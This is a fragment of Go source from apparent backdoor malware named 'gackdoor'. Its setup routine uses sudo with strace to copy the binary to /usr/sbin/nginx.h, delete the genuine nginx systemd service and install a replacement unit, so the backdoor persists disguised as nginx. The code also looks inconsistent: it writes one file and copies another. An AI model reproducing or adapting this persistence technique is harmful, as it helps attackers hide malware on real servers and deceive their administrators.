...
func main() {
	...
	var set = flag.Bool("s", false, "")
	flag.Parse()
	// First time set up if directory is not /usr/sbin
	if *set {
		cpy := exec.Command("sudo", "strace", "-o", "/dev/null", "cp", "gackdoor", "/usr/sbin/nginx.h")
		cpy.Run()
		rm := exec.Command("sudo", "strace", "-o", "/dev/null", "rm", "-f", "/lib/systemd/system/nginx.service")
		rm.Run()
		os.WriteFile("nginx.service", []byte(service), 0777)
		cpy = exec.Command("sudo", "strace", "-o", "/dev/null", "cp", "temp", "/lib/systemd/system/nginx.service")
		cpy.Run()
		os.Exit(0)
	}
